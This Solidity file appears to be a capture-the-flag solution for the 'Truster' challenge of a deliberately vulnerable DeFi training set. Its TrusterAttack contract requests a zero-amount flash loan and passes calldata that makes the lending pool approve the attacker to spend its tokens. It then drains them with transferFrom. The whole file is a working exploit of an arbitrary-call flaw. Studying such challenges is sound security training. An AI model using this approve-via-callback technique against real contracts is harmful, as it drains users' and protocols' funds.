// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../truster/TrusterLenderPool.sol";

contract TrusterAttack {
    function attack(
        address trusterLenderPool,
        address damnValuableToken,
        uint256 amount
    ) external {
        bytes memory targetData = abi.encodeWithSelector(IERC20(damnValuableToken).approve.selector, address(this), amount);
        TrusterLenderPool(trusterLenderPool).flashLoan(0, address(this), damnValuableToken, targetData);
        IERC20(damnValuableToken).transferFrom(trusterLenderPool, msg.sender, amount);
    }
}